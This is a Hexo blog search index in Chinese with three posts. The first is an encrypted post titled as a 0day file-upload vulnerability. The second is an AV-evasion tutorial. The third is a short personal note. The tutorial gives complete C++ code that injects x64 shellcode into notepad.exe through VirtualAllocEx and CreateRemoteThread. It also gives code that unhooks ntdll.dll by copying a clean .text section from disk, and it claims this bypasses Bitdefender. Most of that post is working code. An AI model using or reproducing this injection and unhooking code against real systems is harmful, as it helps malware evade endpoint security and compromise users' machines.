<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>某后台管理系统任意文件上传0Day</title>
      <link href="/2023/07/16/%E6%9F%90%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A00Day/"/>
      <url>/2023/07/16/%E6%9F%90%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A00Day/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不知道密码你看啥." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="db633090fb1145b1fca0634b125cbb9b22843720baaabc23e6b6e66b02e54872">92aa9bd1b795b44ed0b8aaf72b1071e409f845bd2da94090569a6f872922ec7951a9607cfb792b0e3ffe027b21368751dc3538344ddbe2e5a295b3e6c192581a4dbcf73a66edbedaad7545954d1e8d4756cd8899ce63de4a47b070bb6957ace15f80b287571bcf2eb286ca98840c17bfb40ba3b712ae6bdecd867bacec3305ea4d2b8f4ecbe73edabbc6fc834cd7da459432ef1d29650b907095cd347ed8d6c4c63fe87e154b339c329bfe44280f1dba3ad3b09b0f18cb247b3b2b9317d6cb8fb3e845acafbaab9be585781a78d3073745f4fc64a91d253e50725827bd5b98490283a0d3749c33085a642975c3befc756243eff209e4b8f6465066a33a6ad25861c20d1bbccc073967bd91d8c53eefda8392e9ce0979e1ffd36fa73ae0dd1962ab1f3584f6607b7aa4d5f9713f2b9538317f6bd8290a00101253a2451107956eb22607a556acb9699352a67feaa379396041d011bcde644bb747daf6e54015a218d2c5cfe1593f7d334a5c57e8e8839721b272b87e152abe32c6041ad0b7733e1ea035a1e3d6b0caf94f62bec7aed351aaa002674d1ccec4c3f1787d81695dff8332770b2cc4a0f516cc26f9747f88c67c3deed454f4e0af18fe0adeb60e5341ce0ac8c4627ec72ef70a2ddd8af18fe0310b3213bcdc8e51fb2aabc0283c7f56b5e29df3b47c788da8045ac6b263298daa49c2dca0dc3c02eb1b1b3bf69f253fb20b41ca925d0eff245ce934fdc9eac3e3ec5c281ec3a5051891d5e1e85de58e6b1db17ba2aa56d5e0a32102ac372fb97c0101e89b1d2915264be8e2b4f42d43fd2849a215831832bd1d1a6c09977c536f2537f4d7b9bbb8039d3747d5ccafa18180aad8d3d34a955f3bf2f93ddf3540ecbd6e79aae02aacda5398394dfb855c9c7b74a900c045d8d477f1a606901a152129b696edf305e191edbea808f93b7214f00cd3e80714a8bc411047327c142bb118f7afb2e47827f40b8fa5f2b3ebf3e6f4c7b32ca471fa1f8798ae9c08fd75c453cf2012afb7533c0a3b5f0de9587b81d9d3de9c45d68f1aee6d0cf5b444b6a8522889e5b1512fc2341048b620f1d8e3dcbdaff9072d91555f18debd175aba2f4f662eea5673418a50a296880cfdbfd839caa4a381981fa329af1f6a4ae3f41a7f9e58ab299b9a7123b5330541c0ffc7341469d67268aeccf63688518ef58649aab58cca79f5eb73f139c458302a46295cc129b862c0be937d01a7918d73cc39a22c5f9c361c768ff03a2250e6afa52546c571930081ef041b6cdeb91ce57e9df5407a9cd768a419b861755686c8417dcf1a0403ebc851a6f7a9df94bae93f03db4f9617b31e07c3a290b8ccd979a8e3e542179d06b898bf04d0d835065b741e587f75d0178e73b750d7597afc741c95b64da577a4a5184f2d875a465831c67c88121171f65b49b561eb279578f24786521d1f9c6d3b348c7a917c21790f71b2e6fedaf5a646cdd223db90fb213b4f21add36a8f188964cab0723bf5096e32a6441d3878696ae216d865a799fd47e0ca98adb26c98484a96f4329c41ecba6b18f9867e19f552650916b84f3038fade912af1c15d51db5eeffedd08cc7723f63a04fe78ceb20adfe024ed983eb6579ca52d10759a2dc46a8064ac81ba5ca88dbfd51a74754958cf17c815fc6be70e38766e6c4f984c87faf27534496cf0205c4fdfcb1efe09335d1e1bbcd7944471e43311b73ace93cf4f2de9b7946a6dd7f2dc8ff367952f35b97c6317982080140e458bd32dcea159257b3b923dfd86e16226045875ff28575294d73ddb674a5283</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 0Day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从ring3绕过AV hook</title>
      <link href="/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/"/>
      <url>/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/</url>
      
        <content type="html"><![CDATA[<h4 id="0x1、前言"><a href="#0x1、前言" class="headerlink" title="0x1、前言"></a>0x1、前言</h4><p><strong>ntdll.dll常常是被AV&#x2F;EDR hook的主要模块，当程序完全加载完毕后，我们可以尝试从system32目录下加载一个干净的ntdll.dll。</strong></p><ol><li>将 ntdll.dll 的新副本从磁盘映射到进程内存</li><li>查找挂钩的 ntdll.dll 的 .text 部分的虚拟地址</li><li>获取 ntdll.dll 基地址</li><li>模块基址 + 模块的 .text 部分 VirtualAddress</li><li>查找新映射的 ntdll.dll 的 .text 部分的虚拟地址</li><li>获取挂钩模块的 .text 部分的原始内存保护</li><li>将 .text 部分从新映射的 dll 复制到原始（挂钩的）ntdll.dll 的虚拟地址（在第 3 步中找到）——这是取消挂钩的主要部分，因为所有挂钩的字节都被磁盘中的新字节覆盖</li><li>将原始内存保护应用到原始 ntdll.dll 的刚脱钩的 .text 部分</li></ol><h4 id="0x2、分析"><a href="#0x2、分析" class="headerlink" title="0x2、分析"></a>0x2、分析</h4><p>这里使用常规进程注入代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">FindPid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE         hProcessSnap = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL           bRet = FALSE;</span><br><span class="line">    PROCESSENTRY32 pe32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwProcessId;</span><br><span class="line">    hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line">    pe32.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        bRet = <span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">        <span class="keyword">while</span> (bRet) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_wcsicmp(pe32.szExeFile, <span class="string">L&quot;notepad.exe&quot;</span>)) &#123;</span><br><span class="line">                dwProcessId = pe32.th32ProcessID;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            bRet = <span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwProcessId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">INject</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    <span class="comment">//x64 calc shellcode</span></span><br><span class="line">    UCHAR buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    processHandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(processHandle, remoteBuffer, buf, <span class="keyword">sizeof</span> buf, <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (remoteThread) &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(remoteThread, <span class="number">500</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(remoteThread);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(processHandle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD pid = <span class="built_in">FindPid</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Find notepad pid : %d\n&quot;</span>, pid);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">INject</span>(pid);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在无AV环境下正常程序执行DLL加载过程</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121705011.png" alt="image-20230712170555905"></p><p>这时候查看ntdll.dll中的函数是干净的</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121706233.png" alt="image-20230712170633172"></p><p>我们在AV环境下调试程序的时候，杀软会自动加载dll</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121741494.png" alt="image-20230712174120435"></p><p>查看ntdll中的函数，这时候ntdll.dll已经被bitdefender给hook了</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121741109.png" alt="image-20230712174150045"></p><p>由于ntdll.dll在ring3层被hook了，我们如果想要绕过他的hook，就只用重新将一个干净的ntdll.dll加载一次，来绕过ring3的hook，下列是unhook代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">UNHOOKntdll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MODULEINFO Nt = &#123;&#125;;</span><br><span class="line">    HMODULE ntdllModule = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetModuleInformation</span>(<span class="built_in">HANDLE</span>(<span class="number">-1</span>), ntdllModule, &amp;Nt, <span class="built_in">sizeof</span>(Nt));</span><br><span class="line">    LPVOID ntdllBase = (LPVOID)Nt.lpBaseOfDll;</span><br><span class="line">    HANDLE ntdllFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE ntdllMapping = <span class="built_in">CreateFileMapping</span>(ntdllFile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    LPVOID ntdllMappingAddress = <span class="built_in">MapViewOfFile</span>(ntdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;</span><br><span class="line">    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; hookedNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)<span class="built_in">IMAGE_FIRST_SECTION</span>(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">char</span>*)hookedSectionHeader-&gt;Name, (<span class="type">char</span>*)<span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">            DWORD oldProtection = <span class="number">0</span>;</span><br><span class="line">            <span class="type">bool</span> isProtected = <span class="built_in">VirtualProtect</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line">            <span class="built_in">memcpy</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">            isProtected = <span class="built_in">VirtualProtect</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(ntdllFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(ntdllMapping);</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(ntdllModule);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x3、实验"><a href="#0x3、实验" class="headerlink" title="0x3、实验"></a>0x3、实验</h4><p>使用普通注入情况下，直接检测到注入，立刻就被干掉了。</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121754781.png" alt="image-20230712175437731"></p><p>使用reload ntdll.dll，直接将hook移除</p><p>移除前ntdll.dll还是被AV hook中</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121931281.png" alt="image-20230712193135222"></p><p>移除后hook后在检查时发现ntdll.dll已经干净了<img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121929662.png" alt="image-20230712192927602"></p><p>绕过bitdefender注入到notepad中执行shellcode</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121959377.png" alt="image-20230712195927319"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>兜兜转转又从头开始</title>
      <link href="/2023/07/11/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B/"/>
      <url>/2023/07/11/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B/</url>
      
        <content type="html"><![CDATA[<p><strong>2018年的时候搭建了第一个blog，写了一段时间后又觉得不方便，在2019年底的时候转到了公众号，在校期间写了两年好像也就产出了9篇文章(水得一P)，工作后发现，还是得把blog给弄起来，唉，兜兜转转又回到了最初的起点。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
